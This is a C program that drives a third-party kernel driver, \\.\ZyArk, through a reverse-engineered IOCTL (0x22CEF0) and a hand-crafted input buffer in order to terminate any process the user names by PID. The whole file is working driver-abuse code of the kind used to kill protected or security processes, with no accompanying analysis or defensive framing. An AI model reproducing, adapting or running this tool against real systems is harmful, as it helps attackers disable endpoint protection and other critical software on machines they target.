#include <stdio.h>
#include <windows.h>
#include <winnt.h>

// The IOCTL code found in the driver's command table (0x22CEF0)
#define IOCTL_ZYARK_TERMINATE_PROCESS 0x22CEF0

// The required size field in the input buffer
#define REQUIRED_SIZE 2108

// The input buffer structure. The target handle is at offset 2096.
#pragma pack(push, 1)
typedef struct _KILL_REQUEST {
    BYTE Padding[2096];
    HANDLE TargetProcessHandle;
    DWORD  ExitCode;
    BYTE   MorePadding[4];
} KILL_REQUEST, *PKILL_REQUEST;
#pragma pack(pop)

int main(void) {
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    HANDLE hTargetProcess = NULL;
    KILL_REQUEST request = { 0 };
    BOOL bResult = FALSE;
    DWORD bytesReturned = 0;
    DWORD targetPid = 0;

    hDevice = CreateFileA(
        "\\\\.\\ZyArk",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING, 0, NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to connect to the driver. Error: %lu\n", GetLastError());
        printf("    -> You MUST run this from an Administrator command prompt.\n");
        return -1;
    }

    printf("[+] Successfully connected to \\\\.\\ZyArk\n");
    printf("Enter the Process ID (PID) of the process to terminate: ");
    if (scanf_s("%u", &targetPid) != 1) {
        return -1;
    }

    printf("[*] Opening a handle to PID %u...\n", targetPid);
    hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (hTargetProcess == NULL) {
        printf("[-] Failed to open target process. Error: %lu\n", GetLastError());
        CloseHandle(hDevice);
        return -1;
    }
    printf("[+] Successfully opened handle: 0x%p\n", hTargetProcess);

    // Prepare the request buffer
    memset(&request, 0, sizeof(request));
    request.TargetProcessHandle = hTargetProcess;
    request.ExitCode = 0;

    printf("[*] Sending IOCTL 0x%lX to terminate process via handle...\n", IOCTL_ZYARK_TERMINATE_PROCESS);

    // We must pass the REQUIRED_SIZE as the input buffer size, as checked by the driver.
    bResult = DeviceIoControl(
        hDevice,
        IOCTL_ZYARK_TERMINATE_PROCESS,
        &request,
        REQUIRED_SIZE,
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (!bResult) {
        // The driver returns STATUS_CANNOT_DELETE (0xC00000A5) if you try to kill yourself,
        // which GetLastError() translates to 317 (ERROR_MR_MID_NOT_FOUND)
        printf("[-] DeviceIoControl failed. Error: %lu\n", GetLastError());
        printf("    -> Note: This driver prevents you from terminating your own process.\n");
    } else {
        printf("[+] IOCTL sent successfully. The target process should be terminated.\n");
    }

    CloseHandle(hTargetProcess);
    CloseHandle(hDevice);
    getchar();
    return 0;
}
